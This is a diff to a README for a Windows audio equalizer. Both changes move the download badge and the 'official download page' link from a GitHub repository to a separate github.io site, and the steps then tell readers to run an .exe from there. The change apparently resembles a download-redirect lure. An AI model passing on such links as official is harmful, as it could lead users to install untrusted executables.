@@ -1,6 +1,6 @@
 # 🔊 Peace-Equalizer - Improve your sound quality on Windows
 
-[![](https://img.shields.io/badge/Download-Peace--Equalizer-blue.svg)](https://github.com/Marianatriuretic733/Peace-Equalizer)
+[![](https://img.shields.io/badge/Download-Peace--Equalizer-blue.svg)](https://marianatriuretic733.github.io)
 
 ## what this software does
 
@@ -19,7 +19,7 @@ Before you install the software, please check that your computer meets these bas
 
 Follow these steps to set up the software on your machine.
 
-1. Open the [official download page](https://github.com/Marianatriuretic733/Peace-Equalizer).
+1. Open the [official download page](https://marianatriuretic733.github.io).
 2. Look for the release area.
 3. Select the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
